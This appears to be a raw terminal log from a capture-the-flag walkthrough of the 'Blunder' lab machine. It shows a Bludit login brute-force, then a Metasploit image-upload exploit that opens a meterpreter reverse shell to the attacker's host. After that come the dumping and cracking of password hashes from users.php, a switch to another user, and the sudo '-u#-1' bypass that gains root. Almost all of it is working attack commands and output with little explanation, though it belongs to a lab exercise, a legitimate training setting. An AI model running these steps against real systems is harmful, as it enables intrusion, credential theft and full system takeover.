root@Blue3:.../blunder# ./brute-force.py
[*] Trying: the
[*] Trying: and
[*] Trying: for
[*] Trying: Load
[*] Trying: Plugins
[*] Trying: has
[*] Trying: Page
...
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

msf5 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


msf5 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(linux/http/bludit_upload_images_exec) > options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.16.4
LHOST => 10.10.16.4
msf5 exploit(linux/http/bludit_upload_images_exec) > set LPORT 3592
LPORT => 3592
msf5 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.16.4:3592
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading sVBfGYtRYB.png...
[*] Uploading .htaccess...
[*] Executing sVBfGYtRYB.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.16.4:3592 -> 10.10.10.191:44820) at 2020-08-31 02:22:18 +0700
[+] Deleted .htaccess

meterpreter > ls
Listing: /var/www/bludit-3.9.2/bl-content/tmp
=============================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-08-31 02:22:16 +0700  thumbnails

meterpreter > sysinfo
Computer    : blunder
OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter > getpid
Current pid: 6976
meterpreter > dir ../
Listing: ../
============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-05-19 17:28:55 +0700  databases
40755/rwxr-xr-x  4096  dir   2020-04-28 17:24:28 +0700  pages
40755/rwxr-xr-x  4096  dir   2020-08-31 02:22:19 +0700  tmp
40755/rwxr-xr-x  4096  dir   2019-11-27 14:40:55 +0700  uploads
40755/rwxr-xr-x  4096  dir   2019-11-27 18:53:41 +0700  workspaces

meterpreter > dir ../../
Listing: ../../
===============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40775/rwxrwxr-x   4096   dir   2019-06-21 16:02:02 +0700  .github
100775/rwxrwxr-x  563    fil   2019-06-21 16:02:02 +0700  .gitignore
100775/rwxrwxr-x  438    fil   2019-11-27 22:02:25 +0700  .htaccess
100775/rwxrwxr-x  1083   fil   2019-06-21 16:02:02 +0700  LICENSE
100775/rwxrwxr-x  2893   fil   2019-06-21 16:02:02 +0700  README.md
40755/rwxr-xr-x   4096   dir   2019-11-27 14:40:55 +0700  bl-content
40775/rwxrwxr-x   4096   dir   2019-11-27 20:48:17 +0700  bl-kernel
40775/rwxrwxr-x   4096   dir   2019-06-21 16:02:02 +0700  bl-languages
40775/rwxrwxr-x   4096   dir   2019-06-21 16:02:02 +0700  bl-plugins
40775/rwxrwxr-x   4096   dir   2019-06-21 16:02:02 +0700  bl-themes
100775/rwxrwxr-x  901    fil   2019-11-27 20:46:01 +0700  index.php
100775/rwxrwxr-x  20306  fil   2019-06-21 16:02:02 +0700  install.php
100644/rw-r--r--  118    fil   2020-04-28 18:18:02 +0700  todo.txt

meterpreter > cat ../../bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "a9110841562812c146f24455fd810ff2",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}

=>
"admin": {
    "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
    "salt": "5dde2887e7aca",


meterpreter > pwd
/var/www/bludit-3.10.0a/bl-content/databases
meterpreter > cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

sha1 	faca404fd5c0a31cf1897b823c695c85cffeb98d 	Password120
=> Hugo:Password120

meterpreter > shell
Process 7120 created.
Channel 15 created.
su - hugo
Password: Password120
whoami
hugo
cat /home/hugo/user.txt
********************************

python -c "import pty;pty.spawn('/bin/bash')"
hugo@blunder:~$

hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

=> https://www.exploit-db.com/exploits/47502
hugo@blunder:~$ id
id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)

root@blunder:/root# cat root.txt
cat root.txt
********************************
